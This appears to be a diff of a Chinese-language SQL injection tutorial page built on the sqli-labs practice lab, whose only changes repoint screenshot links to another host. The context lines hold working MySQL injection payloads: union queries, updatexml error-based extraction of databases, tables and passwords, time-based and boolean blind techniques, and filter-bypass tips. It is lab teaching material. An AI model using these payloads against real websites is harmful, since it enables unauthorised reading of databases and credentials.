@@ -15,21 +15,21 @@
 <p><code>select * from admin union select 1,version(),3;</code></p>
 <p><code>select * from admin union select 1,@@version,3;</code></p>
 <p><code>select * from admin union select 1,/*!40000 user()*/,3;</code></p>
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.01.05.jpg" alt="Screenshot 2020-02-15 下午5.01.05"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.01.05.jpg" alt="Screenshot 2020-02-15 下午5.01.05"></p>
 <p>路径一般用 <code>@@datadir</code>，然后可以反猜网站的路径。操作系统可以用 <code>@@version_compile_os</code> 来猜解。</p>
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.04.441.jpg" alt="Screenshot 2020-02-15 下午5.04.44"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.04.441.jpg" alt="Screenshot 2020-02-15 下午5.04.44"></p>
 <h4 id="用户、连接信息"><a href="#用户、连接信息" class="headerlink" title="用户、连接信息"></a>用户、连接信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system_user() 系统用户名</span><br><span class="line">user() 	用户名</span><br><span class="line">current_user() 当前用户名</span><br><span class="line">session_user() 连接数据库的用户名</span><br></pre></td></tr></table></figure>
 
 <p><code>select * from admin union select system_user(),current_user(),session_user();</code></p>
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.09.14.jpg" alt="Screenshot 2020-02-15 下午5.09.14"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.09.14.jpg" alt="Screenshot 2020-02-15 下午5.09.14"></p>
 <h4 id="读取-host-信息及-user-信息"><a href="#读取-host-信息及-user-信息" class="headerlink" title="读取 host 信息及 user 信息"></a>读取 host 信息及 user 信息</h4><p><code>select * from admin where id=1 union select 1,host,user from mysql.user;</code></p>
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.14.33.jpg" alt="Screenshot 2020-02-15 下午5.14.33"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.14.33.jpg" alt="Screenshot 2020-02-15 下午5.14.33"></p>
 <p>这里用到了上一篇中讲到的 mysql 库，其中包含了 user/host/password 等信息。</p>
 <p>⚠️ <strong>注意</strong></p>
 <p>通过 host 登录这个信息还可以判断该站是否是站库分离等等。</p>
 <h3 id="0x16-注入-BYPASS-入门"><a href="#0x16-注入-BYPASS-入门" class="headerlink" title="0x16 注入 BYPASS 入门"></a>0x16 注入 <em>BYPASS</em> 入门</h3><h4 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h4><p>针对 sqli-labs lesson1 来练习。</p>
 <p>一开始的套路其实都差不多，先尝试单引号 <code>&#39;</code>，反斜杠 <code>\</code> 等符号报错，然后 <code>and 1=1</code>/<code>and &#39;1&#39;=&#39;1</code>、<code>and 1=2</code>/<code>and &#39;1&#39;=&#39;2</code>，看回显是否有报错。</p>
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%886.01.01.jpg" alt="Screenshot 2020-02-16 下午6.01.01"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%886.01.01.jpg" alt="Screenshot 2020-02-16 下午6.01.01"></p>
 <p>我们先来看报错：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
 
@@ -40,10 +40,10 @@
 <p>接着 order by 判断列数，因为 order by 这个语句本来就是依照第几列来排序，如果超出了列数自然也就会报错，得到列数为 3。</p>
 <p>判断出列数之后就直接上 union select 联合查询。</p>
 <p><code>?id=-1&#39; union select 1,database(),user() limit 0,1 -- +</code></p>
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%886.11.52.jpg" alt="Screenshot 2020-02-16 下午6.11.52"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%886.11.52.jpg" alt="Screenshot 2020-02-16 下午6.11.52"></p>
 <p>然后按之前的步骤进行情报收集、dump 数据。</p>
 <p><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 limit 0,1 -- +</code></p>
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%886.16.31.jpg" alt="Screenshot 2020-02-16 下午6.16.31"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%886.16.31.jpg" alt="Screenshot 2020-02-16 下午6.16.31"></p>
 <p><code>group_concat()</code> 函数使查询的内容以字符串返回，<code>0x7c</code> hex 解码得到 <code>|</code>，路径位置 hex 编码避免单引号。</p>
 <h5 id="🚨-BYPASS"><a href="#🚨-BYPASS" class="headerlink" title="🚨 BYPASS"></a>🚨 <em>BYPASS</em></h5><ol>
 <li><p>如果 <code>group_concat()</code> 函数被过滤，我们可以用其他函数来代替，可以查阅 mysql 函数表。</p>
@@ -72,16 +72,16 @@
 <p>其中关键点是 <code>XPath_string</code>，因为我们传入的不是 <code>XPath_string</code>。为什么要用 <code>concat()</code> 函数呢，因为它是一个连接函数，如果不用的话：<code>(updatexml(1,(select user()),1))</code> 这样也可以，但是需要字符中有特殊字符才会报错，同时它会被中间的特殊字符截断，所以需要用到 <code>concat()</code> 函数用特殊字符连接起来。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 猜解库</span><br><span class="line">?id=1&apos; and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">// 猜解表</span><br><span class="line">?id=1&apos; and updatexml(1,(select concat(0x7e, (table_name),0x7e) FROM information_schema.tables where table_schema=0x7365637572697479 limit 0,1),1) -- +</span><br><span class="line"></span><br><span class="line">// 猜解列</span><br><span class="line">?id=1&apos; and updatexml(1,(select concat(0x7e, (column_name),0x7e) FROM information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1),1) -- +</span><br><span class="line"></span><br><span class="line">// 猜解数据</span><br><span class="line">?id=1&apos; and updatexml(1,(select concat(0x7e, (password),0x7e) FROM security.users where username=0x44756d62 limit 0,1),1) -- +</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.02.15.jpg" alt="Screenshot 2020-02-16 下午7.02.15"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.02.15.jpg" alt="Screenshot 2020-02-16 下午7.02.15"></p>
 <center>猜解库名</center>
 
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.07.54.jpg" alt="Screenshot 2020-02-16 下午7.07.54"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.07.54.jpg" alt="Screenshot 2020-02-16 下午7.07.54"></p>
 <center>猜解表名</center>
 
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.10.21.jpg" alt="Screenshot 2020-02-16 下午7.10.21"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.10.21.jpg" alt="Screenshot 2020-02-16 下午7.10.21"></p>
 <center>猜解列名</center>
 
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.16.15.jpg" alt="Screenshot 2020-02-16 下午7.16.15"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.16.15.jpg" alt="Screenshot 2020-02-16 下午7.16.15"></p>
 <center>爆破数据</center>
 
 <p>在报错中直接使用 mysql 最基本的查表就可以了，也可以把 concat 放在外面：<code>updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)</code></p>
@@ -106,13 +106,13 @@
 <p>从最简单的盲注开始：</p>
 <h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a><em>sleep()</em></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 判断当前用户的用户名，从第一位开始</span><br><span class="line">mysql&gt; select * from users where id=1 and if((substr((select user()),1,1)=&apos;r&apos;),sleep(5),id=1);</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%889.42.58.jpg" alt="Screenshot 2020-02-16 下午9.42.58"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%889.42.58.jpg" alt="Screenshot 2020-02-16 下午9.42.58"></p>
 <h5 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark()"></a><em>benchmark()</em></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 判断当前用户的用户名前两位</span><br><span class="line">mysql&gt; select * from users where id=1 and if((substr((select user()),1,2)=&apos;ro&apos;),benchmark(20000000,md5(&apos;a&apos;)),id=1);</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%889.54.09.jpg" alt="Screenshot 2020-02-16 下午9.54.09"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%889.54.09.jpg" alt="Screenshot 2020-02-16 下午9.54.09"></p>
 <h5 id="case-when-then-else-end"><a href="#case-when-then-else-end" class="headerlink" title="case when then else end"></a><em>case when then else end</em></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 判断当前用户的用户名</span><br><span class="line">mysql&gt; select * from users where id=1 and case when (substr((select user()),1,4)=&apos;root&apos;) then sleep(5) else id=1 end;</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.03.30.jpg" alt="Screenshot 2020-02-16 下午10.03.30"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.03.30.jpg" alt="Screenshot 2020-02-16 下午10.03.30"></p>
 <p>不推荐使用笛卡尔积，当数据过多时会造成 DDOS。</p>
 <h5 id="🚨-BYPASS-1"><a href="#🚨-BYPASS-1" class="headerlink" title="🚨 BYPASS"></a>🚨 <em>BYPASS</em></h5><p>必须要使用到 or 的延时注入不如试试子查询，只延时 5s。</p>
 <p><code>?id=1&#39; or if((substr((select user()),1,4)=&#39;root&#39;),(select sleep(5) from information_schema.schemata as b),1); -- +</code></p>
@@ -121,29 +121,29 @@
 <p>布尔盲注的原理是如果 and 两边都为真，则正常返回数据，如果其中一边为假，则查询不到数据。</p>
 <p><code>select * from users where id=1 and 0;</code></p>
 <p><code>select * from users where id=1 and 1;</code></p>
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.26.55.jpg" alt="Screenshot 2020-02-16 下午11.26.55"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.26.55.jpg" alt="Screenshot 2020-02-16 下午11.26.55"></p>
 <p>参考：<a href="https://www.anquanke.com/post/id/170626" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170626</a></p>
 <h5 id="字符串截取对比"><a href="#字符串截取对比" class="headerlink" title="字符串截取对比"></a>字符串截取对比</h5><p>类似的函数还有很多。</p>
 <p><code>?id=1&#39; and substr((select user()),1,4)=&#39;root&#39; -- +</code></p>
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.16.33.jpg" alt="Screenshot 2020-02-16 下午10.16.33"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.16.33.jpg" alt="Screenshot 2020-02-16 下午10.16.33"></p>
 <center>返回正常，用户名为 root</center>
 
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.17.13.jpg" alt="Screenshot 2020-02-16 下午10.17.13"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.17.13.jpg" alt="Screenshot 2020-02-16 下午10.17.13"></p>
 <center>没有回显，用户名不是 user</center>
 
 <h5 id="ifnull-函数"><a href="#ifnull-函数" class="headerlink" title="ifnull() 函数"></a><em>ifnull()</em> 函数</h5><p><code>ifnull()</code> 函数有两个参数，该函数判断第一个表达式是否为 NULL（0），如果为 NULL（0），则返回第二个参数的值，否则返回第一个参数的值。</p>
 <p>⚠️ 注意</p>
 <p>但是这里实测发现，<code>ifnull()</code> 函数判断第一个值，如果为真则返回 1，否则返回 0，不会返回第二个值，这里记录一下。</p>
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.23.33.jpg" alt="Screenshot 2020-02-16 下午11.23.33"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.23.33.jpg" alt="Screenshot 2020-02-16 下午11.23.33"></p>
 <p><code>?id=1&#39; and ifnull((substr((select user()),1,4)=&#39;root&#39;),0) -- +</code></p>
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.40.21.jpg" alt="Screenshot 2020-02-16 下午10.40.21"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.40.21.jpg" alt="Screenshot 2020-02-16 下午10.40.21"></p>
 <h5 id="比较函数-strcmp"><a href="#比较函数-strcmp" class="headerlink" title="比较函数 strcmp()"></a>比较函数 <em>strcmp()</em></h5><p><code>strcmp()</code> 函数有两个参数，STRCMP(expr1,expr2)，如果两个字符串相同，则返回 0，如果第一个参数根据当前排序顺序小于第二个参数，则返回 -1，否则返回 1。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 实例</span><br><span class="line">SELECT strcmp(123, 123);        # 0</span><br><span class="line">SELECT strcmp(123, 122);        # 1</span><br><span class="line">SELECT strcmp(123, 124);        # -1</span><br><span class="line"></span><br><span class="line">SELECT strcmp(&apos;abc&apos;, &apos;abc&apos;);    # 0</span><br><span class="line">SELECT strcmp(&apos;abc&apos;, &apos;abb&apos;);    # 1</span><br><span class="line">SELECT strcmp(&apos;abc&apos;, &apos;abd&apos;);    # -1</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 如果用户名是root，则返回1，1大于0返回1，and两边为1，正常返回数据</span><br><span class="line">?id=1 and strcmp((substr((select user()),1,4)=&apos;root&apos;),0) -- +</span><br><span class="line"></span><br><span class="line">// 如果用户名不是toor，则返回0，0等于0返回0，查询不到数据</span><br><span class="line">?id=1 and strcmp((substr((select users()),1,4)=&apos;toor&apos;),0) -- +</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.31.21.jpg" alt="Screenshot 2020-02-16 下午11.31.21"></p>
-<p><img src="//naykcin.top/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.31.34.jpg" alt="Screenshot 2020-02-16 下午11.31.34"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.31.21.jpg" alt="Screenshot 2020-02-16 下午11.31.21"></p>
+<p><img src="//mucfo.cn/2020/01/07/sqlibypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8811.31.34.jpg" alt="Screenshot 2020-02-16 下午11.31.34"></p>
 <p><em>Hard work and no play makes Nick a dull boy.</em></p>
 </div><div class="article-meta" style="max-width:800px"></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2020/01/08/sqlibypass3/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2020/01/06/sqlibypass/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2022 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
 window.onload = function () {
